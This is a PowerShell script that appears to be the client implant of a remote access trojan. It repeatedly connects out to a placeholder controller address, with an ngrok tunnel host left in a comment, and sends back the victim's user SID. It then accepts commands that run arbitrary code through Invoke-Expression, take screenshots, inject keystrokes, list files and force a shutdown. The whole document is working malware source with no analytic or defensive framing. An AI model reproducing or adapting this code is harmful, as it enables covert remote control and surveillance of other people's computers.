function get_info {
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $currentUserSid = $currentUser.User.Value.Substring(0,29)
    $monitors = @(Get-CimInstance -Namespace root\wmi -ClassName WmiMonitorBasicDisplayParams).Length
    $values = @{
        "hwid" = $currentUserSid
        "monitors" = $monitors
    }
    $data = $values | ConvertTo-Json
    return $data
}
function send_data($message, $data_stream) {
    $bytes = [System.Text.Encoding]::ASCII.GetBytes($message.Length.ToString() + " " + $message)
    $data_stream.Write($bytes, 0, $bytes.Length)
    $data_stream.Flush()
}

function recv($data_stream) {
    $received_data = $null
    try {
        $bytes = New-Object byte[] 4096
        $received_data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $data_stream.Read($bytes, 0, $bytes.Length)).Split(" ", 2)[1]
        while($data_stream.DataAvailable) {
            $more_data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $data_stream.Read($bytes, 0, $bytes.Length))
            $received_data += $more_data
        }
        if($null -ne $received_data) {
            return $received_data
        } else {
            return "RESET"
        }
    } catch {
        return "RESET"
    }
}

function shell($command, $data_stream) {
    try {$command = (IEX $command 2>&1 | Out-String )}
    catch {$command = ($_ | Out-String)}
    $output = $command + "PS " + (pwd)
    return "shell:" + $output
}

function screenshot($screenIndex, $type, $quality) {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        $screens = [System.Windows.Forms.Screen]::AllScreens
        if ($screenIndex -eq "ALL") {
            $bounds = [System.Drawing.Rectangle]::Empty
            foreach ($screen in $screens) {
                $bounds = [System.Drawing.Rectangle]::Union($bounds, $screen.Bounds)
            }
        } else {
            $screen = $screens[[int]$screenIndex]
            $bounds = $screen.Bounds
        }
        $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height, [System.Drawing.Imaging.PixelFormat]::Format32bppArgb)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size, [System.Drawing.CopyPixelOperation]::SourceCopy)
        $encoder = [System.Drawing.Imaging.Encoder]::Quality
        $qualityParam = New-Object System.Drawing.Imaging.EncoderParameter($encoder, [long]$quality)
        $jpegCodec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.FormatID -eq [System.Drawing.Imaging.ImageFormat]::Jpeg.Guid }
        $encoderParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
        $encoderParams.Param[0] = $qualityParam
        $bytes = [System.IO.MemoryStream]::new()
        $bitmap.Save($bytes, $jpegCodec, $encoderParams)
        $screenshot_bytes = $bytes.ToArray()
        $encrypted_base64 = [System.Convert]::ToBase64String($screenshot_bytes)
        return $type + $encrypted_base64
    } catch {
        return "FATAL:" + $type.Substring(0, $type.Length-1)
    }
}

function main {
    # $ip_address = "5.tcp.eu.ngrok.io"
    # $port_number = 17776
    Add-Type -AssemblyName System.Windows.Forms
    $ip_address = "CLIENT_IP"
    $port_number = CLIENT_PORT
    while ($true) {
        try {
            $client = New-Object System.Net.Sockets.TCPClient($ip_address,$port_number)
            $data_stream = $client.GetStream()
            break
        }
        catch {
            Start-Sleep 1   
        }
    }
    $values = get_info
    send_data $values $data_stream
    while($true) {
        $recv = recv $data_stream
        if ($recv.StartsWith("screenshot:")) {
            Write-Host $recv
            $index = $recv.Split(":", 2)[1]
            $ss = screenshot $index "screenshot:" 100
            Write-Host $ss.Length
            send_data $ss $data_stream
        } elseif ($recv.StartsWith("record:")) {
            $index = $recv.Split(":")
            Write-Host $index[1] $index[2] $index[3]
            if ($index[3] -ne '-1') {
                $char = [char]::ConvertFromUtf32([int]$index[3])
                [System.Windows.Forms.SendKeys]::SendWait($char)
            }
            $ss = screenshot $index[1] "record:" $index[2]
            send_data $ss $data_stream
        }
        elseif ($recv -eq "start_record") {
            send_data "recording" $data_stream
        } elseif ($recv -eq "Shutdown") {
            shutdown -s -f -t 0
        } elseif ($recv -eq "Restart") {
            shutdown -r -f -t 0
        } elseif ($recv -eq "Lock") {
            shutdown -l
        } elseif ($recv -eq "shell") {
            send_data "open_shell" $data_stream
        } elseif ($recv.StartsWith("shell:")) {
            $command = $recv.Split(":", 2)[1]
            $output = shell $command
            send_data $output $data_stream
        } elseif ($recv -eq "Disconnect") {
            $data_stream.Close()
            Exit 0
        } elseif ($recv -eq "RESET") {
            return 1
        } elseif ($recv.StartsWith("update:")) {
            try {
                $command = $recv.Split(":", 2)[1]
                Write-Host $command
                Invoke-Expression $command
            } catch {
                Write-Host $_
            }
        } elseif ($recv -eq "files") {
            $items = Get-ChildItem -Path (pwd).Path | Select-Object Name,@{Name="Type";Expression={if($_.PSIsContainer){"Folder"}else{"File"}}} | ConvertTo-Json
            $itemsObject = $items | ConvertFrom-Json
            $newItem = @{ Extension = (pwd).Path; Name = "CWD" }
            $updatedItems = @($itemsObject) + $newItem
            $updatedItemsJson = $updatedItems | ConvertTo-Json
            $data = "Files->" + $updatedItemsJson
            send_data $data $data_stream
            Write-Host "sent files"
        } elseif ($recv -eq "File Explorer") {
            Write-Host "Received File Explorer"
            send_data "File Explorer" $data_stream
        }
    }
}
while ($true) {
    if (main -eq "RESET") {
        main
    } else {
        break
    }
}


